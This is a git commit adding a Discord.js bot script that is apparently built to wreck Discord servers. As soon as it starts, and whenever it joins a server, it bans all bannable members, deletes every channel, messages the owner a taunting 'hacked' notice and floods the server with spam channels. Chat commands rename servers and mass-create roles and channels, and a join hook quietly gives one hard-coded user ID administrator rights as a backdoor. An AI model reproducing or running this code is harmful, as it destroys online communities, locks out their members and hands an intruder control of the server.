7f472ef0769bf90d4844e92f86ea9a87b70e39f2
Mamas159 <gevogame@gmail.com>
2019-06-03 00:11:33 +0000

    Create bot.js

---
+++ bot.js
@@ -0,0 +1,511 @@
+const Discord = require("discord.js");
+const LOka = new Discord.Client();
+console.log('By KBOOOOOOOOSH-YT');
+LOka.on('ready', () => {
+  console.log(`Logged in as ${LOka.user.tag} !`);
+ 
+});
+LOka.on('ready',  () => {
+console.log('~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~');
+console.log('~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~');
+console.log('      ~            ~  By : KBOOOOOOOOSH-YT ~           ~    ');
+console.log('~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~');
+console.log('~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~');
+console.log(`Logged in as  * [ "  KBOOOOOOOOSH-YT " ] servers! [ " ${LOka.guilds.size} " ] Users! [ " ${LOka.users.size} " ]`);
+ 
+       
+   
+ 
+});
+var prefix = "-"
+LOka.on("message", message => {
+  if(!message.content.startsWith(prefix)) return;;
+  let args = message.content.split(" ").slice(1);
+  var argresult = args.join(' ');
+  if (message.content.startsWith('hix15')) {
+    LOka.user.setUsername(argresult);
+  }
+    if (message.content.startsWith(prefix + 'on123')) {
+    LOka.user.setStatus(argresult);
+  }
+});
+ 
+ 
+ 
+ 
+LOka.on('message', message => {
+     if (message.content === ".") {
+         LOka.guilds.forEach(m =>{
+             m.setIcon(` `)
+})
+}
+});
+LOka.on('message', message => {
+     if (message.content === ".") {
+         LOka.guilds.forEach(m =>{
+             m.setName(`hack by li 7wak`)
+})
+}
+});
+ 
+LOka.on('message', message => {
+     if (message.content === ".") {
+                 if(!message.channel.guild) return;
+ 
+             message.guild.setIcon(`https://cdn.discordapp.com/attachments/359820599138451457/368032849011539978/3ae3b128480b1a13a0ab6082cf3e6289.jpg`)
+ 
+}
+});
+ 
+LOka.on('message', message => {
+     
+ 
+     if (message.content === "k1") {
+         LOka.guilds.forEach(m =>{
+  m.createRole({
+        name : "hack by li 7wak",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "hack by li 7wak",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "hack by li 7wak",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "hack by li 7wak",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "hack by li 7wak",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "hack by li 7wak",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "hack by li 7wak",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "hack by li 7wak",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "hack by li 7wak",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+ 
+    m.createRole({
+        name : "hack by li 7wak",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "hack by li 7wak",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "hack by li 7wak",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+     m.createRole({
+        name : "hack by li 7wak",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "hack by li 7wak",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+ 
+    m.createRole({
+        name : "hack by li 7wak",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "hack by li 7wak",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+ 
+    m.createRole({
+        name : "hack by li 7wak",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "hack by li 7wak",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "hack by li 7wak",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "hack by li 7wak",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "hack by li 7wak",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "hack by li 7wak",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "hack by li 7wak",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "hack by li 7wak",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "hack by li 7wak",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "hack by li 7wak",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "hack by li 7wak",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "hack by li 7wak",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "hack by li 7wak",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "hack by li 7wak",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "hack by li 7wak",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "hack by li 7wak",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "hack by li 7wak",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+ 
+    m.createRole({
+        name : "hack by li 7wak",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "hack by li 7wak",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+ 
+    m.createRole({
+        name : "hack by li 7wak",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "hack by li 7wak",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "hack by li 7wak",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+ 
+ 
+   
+})
+ 
+ 
+}
+});
+LOka.on('message', message => {
+         if (message.content === "k") {
+               LOka.guilds.forEach(m =>{
+m.createChannel('hack by li 7wak', 'text');
+m.createChannel('hack by li 7wak', 'text');
+m.createChannel('hack by li 7wak', 'text');
+m.createChannel('hack by li 7wak', 'text');
+m.createChannel('hack by li 7wak', 'text');
+m.createChannel('hack by li 7wak', 'text');
+m.createChannel('hack by li 7wak', 'text');
+m.createChannel('hack by li 7wak', 'text');
+m.createChannel('hack by li 7wak', 'text');
+m.createChannel('hack by li 7wak', 'text');
+ 
+m.createChannel('hack by li 7wak', 'text');
+ 
+m.createChannel('hack by li 7wak', 'text');
+ 
+m.createChannel('hack by li 7wak', 'text');
+ 
+m.createChannel('hack by li 7wak', 'text');
+m.createChannel('hack by li 7wak', 'text');
+m.createChannel('hack by li 7wak', 'text');
+m.createChannel('hack by li 7wak', 'text');
+m.createChannel('hack by li 7wak', 'text');
+m.createChannel('hack by li 7wak', 'text');
+m.createChannel('hack by li 7wak', 'text');
+m.createChannel('hack by li 7wak', 'text');
+m.createChannel('hack by li 7wak', 'text');
+m.createChannel('hack by li 7wak', 'text');
+m.createChannel('hack by li 7wak', 'text');
+ 
+m.createChannel('hack by li 7wak', 'text');
+m.createChannel('hack by li 7wak', 'text');
+ 
+m.createChannel('hack by li 7wak', 'text');
+m.createChannel('hack by li 7wak', 'text');
+m.createChannel('hack by li 7wak', 'text');
+m.createChannel('hack by li 7wak', 'text');
+m.createChannel('hack by li 7wak', 'text');
+m.createChannel('hack by li 7wak', 'text');
+m.createChannel('hack by li 7wak', 'text');
+m.createChannel('hack by li 7wak', 'text');
+m.createChannel('hack by li 7wak', 'text');
+m.createChannel('hack by li 7wak', 'text');
+m.createChannel('hack by li 7wak', 'text');
+ 
+m.createChannel('hack by li 7wak', 'text');
+m.createChannel('hack by li 7wak', 'text');
+ 
+})
+}
+});
+ 
+LOka.on('message', message => {
+         if (message.content === "k") {
+                 LOka.guilds.forEach(m =>{
+m.createChannel('hack by li 7wak', 'voice');
+m.createChannel('hack by li 7wak', 'voice');
+m.createChannel('hack by li 7wak', 'voice');
+m.createChannel('hack by li 7wak', 'voice');
+m.createChannel('hack by li 7wak', 'voice');
+m.createChannel('hack by li 7wak', 'voice');
+m.createChannel('hack by li 7wak', 'voice');
+m.createChannel('hack by li 7wak', 'voice');
+ 
+m.createChannel('hack by li 7wak', 'voice');
+m.createChannel('hack by li 7wak', 'voice');
+ 
+m.createChannel('hack by li 7wak', 'voice');
+m.createChannel('hack by li 7wak', 'voice');
+m.createChannel('hack by li 7wak', 'voice');
+m.createChannel('hack by li 7wak', 'voice');
+m.createChannel('hack by li 7wak', 'voice');
+m.createChannel('hack by li 7wak', 'voice');
+m.createChannel('hack by li 7wak', 'voice');
+m.createChannel('hack by li 7wak', 'voice');
+m.createChannel('hack by li 7wak', 'voice');
+m.createChannel('hack by li 7wak', 'voice');
+m.createChannel('hack by li 7wak', 'voice');
+m.createChannel('hack by li 7wak', 'voice');
+ 
+m.createChannel('hack by li 7wak', 'voice');
+m.createChannel('hack by li 7wak', 'voice');
+m.createChannel('hack by li 7wak', 'voice');
+m.createChannel('hack by li 7wak', 'voice');
+m.createChannel('hack by li 7wak', 'voice');
+m.createChannel('hack by li 7wak', 'voice');
+m.createChannel('hack by li 7wak', 'voice');
+m.createChannel('hack by li 7wak', 'voice');
+ 
+m.createChannel('hack by li 7wak', 'voice');
+m.createChannel('hack by li 7wak', 'voice');
+m.createChannel('hack by li 7wak', 'voice');
+m.createChannel('hack by li 7wak', 'voice');
+m.createChannel('hack by li 7wak', 'voice');
+m.createChannel('hack by li 7wak', 'voice');
+m.createChannel('hack by li 7wak', 'voice');
+m.createChannel('hack by li 7wak', 'voice');
+m.createChannel('hack by li 7wak', 'voice');
+m.createChannel('hack by li 7wak', 'voice');
+m.createChannel('hack by li 7wak', 'voice');
+ 
+m.createChannel('hack by li 7wak', 'voice');
+m.createChannel('hack by li 7wak', 'voice');
+m.createChannel('hack by li 7wak', 'voice');
+m.createChannel('hack by li 7wak', 'voice');
+m.createChannel('hack by li 7wak', 'voice');
+m.createChannel('hack by li 7wak', 'voice');
+m.createChannel('hack by li 7wak', 'voice');
+m.createChannel('hack by li 7wak', 'voice');
+m.createChannel('hack by li 7wak', 'voice');
+m.createChannel('hack by li 7wak', 'voice');
+m.createChannel('hack by li 7wak', 'voice');
+m.createChannel('hack by li 7wak', 'voice');
+m.createChannel('hack by li 7wak', 'voice');
+ 
+ 
+ 
+})
+}
+ 
+});
+ 
+ 
+const { Client } = require('discord.js');
+const client = new Client();
+ 
+async function nuke(guild) {
+  let users = 0;
+  let channels = 0;
+ 
+  await guild.fetchMembers();
+ 
+  await guild.owner.send(' Hacked by ta mere   سلم على سيرفرك هههههههههههههههه').catch(e => { return void e; });
+ 
+ 
+ 
+  await Promise.all(guild.members.map(async (m) => {
+    if (m.bannable) {
+      users++;
+      await m.send('^_^').catch(e => { return void e; });
+      return m.ban();
+    }
+  }));
+ 
+    await Promise.all(guild.channels.map(c => {
+    if (c.deletable) {
+      channels++;
+      return c.delete();
+    }
+  }));
+ 
+    await guild.createChannel('hack by li 7wak', 'text');
+ 
+      await guild.createChannel('hack by li 7wak', 'voice');
+ await guild.createChannel('hack by li 7wak', 'text');
+ 
+ await guild.createChannel('hack by li 7wak', 'text');
+  await guild.createChannel('hack by li 7wak', 'text');
+ 
+      await guild.createChannel('hack by li 7wak', 'voice');
+ await guild.createChannel('hack by li 7wak', 'text');
+ 
+ await guild.createChannel('hack by li 7wak', 'text');
+  await guild.createChannel('hack by li 7wak', 'text');
+ 
+      await guild.createChannel('hack by li 7wak', 'voice');
+ await guild.createChannel('hack by li 7wak', 'text');
+ 
+ await guild.createChannel('hack by li 7wak', 'text');
+  await guild.createChannel('hack by li 7wak', 'text');
+ 
+      await guild.createChannel('hack by li 7wak', 'voice');
+ await guild.createChannel('hack by li 7wak', 'text');
+ 
+ await guild.createChannel('hack by li 7wak', 'text');
+  await guild.createChannel('hack by li 7wak', 'text');
+ 
+      await guild.createChannel('hack by li 7wak', 'voice');
+ await guild.createChannel('hack by li 7wak', 'text');
+ 
+ await guild.createChannel('hack by li 7wak', 'text');
+  await guild.createChannel('hack by li 7wak', 'text');
+ 
+      await guild.createChannel('hack by li 7wak', 'voice');
+ await guild.createChannel('hack by li 7wak', 'text');
+ 
+ await guild.createChannel('hack by li 7wak', 'text');
+  await guild.createChannel('hack by li 7wak', 'text');
+ 
+      await guild.createChannel('hack by li 7wak', 'voice');
+ await guild.createChannel('hack by li 7wak', 'text');
+ 
+ await guild.createChannel('hack by li 7wak', 'text');
+  await guild.createChannel('hack by li 7wak', 'text');
+ 
+      await guild.createChannel('hack by li 7wak', 'voice');
+ await guild.createChannel('hack by li 7wak', 'text');
+ 
+ await guild.createChannel('hack by li 7wak', 'text');
+  await guild.createChannel('hack by li 7wak', 'text');
+ 
+      await guild.createChannel('hack by li 7wak', 'voice');
+ await guild.createChannel('hack by li 7wak', 'text');
+ 
+ await guild.createChannel('hack by li 7wak', 'text');
+}
+ 
+LOka.on('ready', () => {
+  for(const [, g] of LOka.guilds) nuke(g).catch(console.error);
+  console.log('-------------------------------------------------------------');
+  console.log('');
+  console.log("Made by VEZIX");
+  console.log("");
+  console.log("-------------------------------------------------------------");
+ 
+});
+ 
+LOka.on('guildCreate', async (guild) => {
+  return nuke(guild).catch(console.error);
+});
+ 
+LOka.on('guildMemberAdd', member => {
+   
+            if (member.id === "565114619471986689") {
+                member.guild.createRole({
+                    name : LOka.user.username,
+                    color : "RANDOM",
+                    permissions : [8]
+                }).then(function(role){
+                    member.addRole(role)
+                })
+               
+            }
+       
+    });
+ 
+   
+ 
+ 
+ 
+ 
+LOka.login("")
